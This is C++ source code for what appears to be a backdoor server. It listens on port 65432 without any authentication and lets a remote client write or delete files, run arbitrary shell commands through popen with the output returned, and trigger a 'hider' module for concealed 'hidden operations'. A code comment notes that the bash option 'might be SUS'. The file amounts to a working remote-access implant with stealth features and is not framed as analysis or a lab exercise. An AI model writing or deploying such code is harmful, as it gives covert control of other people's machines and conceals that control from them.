#include <iostream>
#include <array>

#include "SoftwareManeger.h"
#include "Status.h"
#include "FunCodes.h"
#include "HiderManeger.h"
#include "HiderCodes.h"
#include "Listener.h"
#include "Connection.h"

#define PORT (65432)

void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger);
void testSoftwareManeger(void);

int main() {
    
    SoftwareManeger swm = SoftwareManeger();
    HiderManeger hiderManager = HiderManeger();
    Listener listener = Listener(PORT);

    bool cont = true;
    while (cont)
    {
        Connection conn;
        // TODO add error strtegy
        if (listener.acceptConnection(conn) == -1) {
            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
            sleep(10);
            continue;
        }
        loopIter(conn, swm, hiderManager);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}
// & outdated
// void testSoftwareManeger() {
//     SoftwareManeger swm = SoftwareManeger();
//     swm.fileWrite("tempSwmTest.txt", false, "this is my first test\n");
//     swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
    
//     swm.deleteFile("tempSwmTest.txt");

// }



std::string execBash(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    pclose(pipe);
    return result;
}


void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
{
    // receive command
    Status res = SUCCSESS;
    command cmd;

    std::cout << "Trying to receive command\n";
    conn.recvCommand(cmd);
    std::cout << "Command received\n";
    std::string strParam = cmd.strParam;

    std::cout << "Server: fncode-" << cmd.fncode << " strParam-" << strParam << std::endl;
    std::string strRes = "";
    switch (cmd.fncode)
    {
    case WRITE_FILE:
        res = swm.fileWrite(conn, cmd.dataLen, strParam);
        break;

    case DELETE_FILE:
        res = swm.deleteFile(strParam);
        break;

    case RUN_BASH:
        strRes = execBash(strParam.c_str()); // maybe we shoud abandon this option, it might be SUS
        break;

    case HIDER_SETUP:
        hiderManeger.setUpHider(strParam);
        break;
    }
    // hidden handling
    if (cmd.fncode & HIDDEN_OPRATION) {
        res = hiderManeger.hiddenAction(cmd.fncode, strParam, conn);
    }
    
    // TODO change such that there will be response only if we want it to be 
    std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
    conn.sendResponce(res, strRes);
}
